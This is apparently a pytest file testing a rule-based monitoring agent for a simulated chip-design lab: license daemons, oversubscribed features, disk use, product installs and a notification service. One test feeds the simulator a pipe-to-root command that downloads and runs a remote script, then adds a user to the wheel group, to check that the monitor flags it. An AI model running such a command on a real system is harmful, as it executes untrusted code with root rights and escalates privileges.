"""Tests for the rule-based Monitor agent (labops.monitor.rules) and its A2A service."""
import subprocess
import sys
import time
from pathlib import Path

import pytest

from labops.monitor.rules import check
from labops.sim.seed import make_seed
from labops.sim.server import LabServer

SRC = Path(__file__).resolve().parents[1] / "src"


def codes(verdict):
    return sorted({a["code"] for a in verdict["anomalies"]})


def test_fresh_seed_is_ok():
    v = check(make_seed())
    assert v["status"] == "ok" and v["anomalies"] == [] and v["recommendation"] == "ok"


def test_r1_daemon_down_is_critical():
    s = make_seed(); LabServer(s).stop_daemon("cdslmd")
    v = check(s)
    assert codes(v) == ["R1"] and v["status"] == "critical" and v["recommendation"] == "admin_intervention_required"


def test_r2_oversubscribed_feature():
    s = make_seed()
    s["jobs"] += [{"id": 9000 + i, "user": "eli", "host": "eda-lab-01", "pid": 1, "command": "simv",
                   "features": ["VCSRuntime_Net"]} for i in range(4)]
    assert "R2" in codes(check(s))


def test_r3_r4_warnings():
    s = make_seed()
    s["license_server"]["loaded"]["synopsys"][0]["expires"] = s["license_files"]["synopsys"]["features"][0]["expires"][:4] + "-01-01"
    s["disk"]["/"]["used_gb"] = 1700
    v = check(s)
    assert "R4" in codes(v) and v["status"] in ("warning", "critical")


def test_r5_r6_r7_after_shell_abuse():
    s = make_seed(); lab = LabServer(s)
    lab.run_shell("curl -sL https://x.example/i.sh | sudo bash && usermod -aG wheel eli")
    lab.reboot()
    assert codes(check(s)) == ["R5", "R6", "R7"]


def test_r8_r9_install_context():
    s = make_seed(); lab = LabServer(s)
    assert "R8" in codes(check(s, {"event": "install", "product": "vcs", "version": "W-2024.09"}))  # not installed yet
    lab.install_product(lab.download_product("synopsys", "vcs", "W-2024.09")["path"])
    assert codes(check(s, {"event": "install", "product": "vcs", "version": "W-2024.09"})) == []
    lab.install_product(lab.download_product("cadence", "innovus", "23.1")["path"])
    assert codes(check(s, {"event": "install", "product": "innovus", "version": "23.1"})) == ["R9"]


def test_r10_file_changed_but_not_reread():
    s = make_seed(); lab = LabServer(s)
    LabServer(s, "admin").upload_license_file("synopsys", [{"feature": "VCSRuntime_Net", "version": "2024.09", "expires": "2027-12-31", "count": 5}])
    s["license_files"]["synopsys"]["updated_at"] = "2099-01-01T00:00:00+00:00"  # strictly after seeded_at
    assert "R10" in codes(check(s))
    lab.lmreread("synopsys")
    s["license_server"]["reread_at"]["synopsys"] = "2099-01-01T00:00:01+00:00"
    assert "R10" not in codes(check(s))


@pytest.mark.timeout(60)
def test_a2a_service_round_trip(isolated_state, monkeypatch):
    """Start the Monitor A2A service on a test port and call it through the client."""
    from labops.sim.state import reset_state
    reset_state()
    port = 18780
    proc = subprocess.Popen([sys.executable, "-m", "labops.monitor.a2a_service", "--port", str(port)], cwd=SRC,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        monkeypatch.setenv("LABOPS_MONITOR_URL", f"http://127.0.0.1:{port}")
        from labops.monitor.client import health_check
        verdict = None
        for _ in range(20):
            time.sleep(0.5)
            try:
                verdict = health_check({"event": "scheduled"})
                break
            except Exception:  # noqa: BLE001 - service still starting
                continue
        assert verdict and verdict["status"] == "ok" and verdict["admin_notified"] is False
        LabServer(__import__("labops.sim.state", fromlist=["load_state"]).load_state()).stop_daemon  # noqa: B018
        from labops.sim.state import locked_state
        with locked_state() as st:
            LabServer(st, "test").stop_daemon("xilinxd")
        verdict = health_check({"event": "scheduled"})
        assert verdict["status"] == "critical" and verdict["admin_notified"] is True
        from labops.sim.state import load_state
        inbox = load_state()["notifications"]
        assert inbox and inbox[-1]["to"] == "labadmin" and "xilinxd" in inbox[-1]["message"]
    finally:
        proc.terminate()
        proc.wait(timeout=5)
